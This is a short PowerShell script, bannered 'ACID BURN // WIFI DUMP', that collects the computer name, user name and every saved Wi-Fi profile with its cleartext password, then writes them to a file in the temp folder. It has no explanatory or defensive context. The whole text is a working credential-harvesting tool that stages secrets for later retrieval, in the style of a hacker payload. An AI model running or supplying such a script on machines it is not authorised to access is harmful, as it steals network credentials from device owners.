$out = "$env:TEMP\wifi_dump.txt"
"=== ACID BURN // WIFI DUMP ===" | Out-File $out
"Host: $env:COMPUTERNAME" | Out-File $out -Append
"User: $env:USERNAME" | Out-File $out -Append
"Time: $(Get-Date)" | Out-File $out -Append
"" | Out-File $out -Append

$profiles = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

foreach ($p in $profiles) {
    $details = netsh wlan show profile name="$p" key=clear
    $key = ($details | Select-String "Key Content") -replace ".*:\s*", ""
    if ($key) {
        "$p : $key" | Out-File $out -Append
    } else {
        "$p : (open / no key)" | Out-File $out -Append
    }
}

"" | Out-File $out -Append
"=== END ===" | Out-File $out -Append
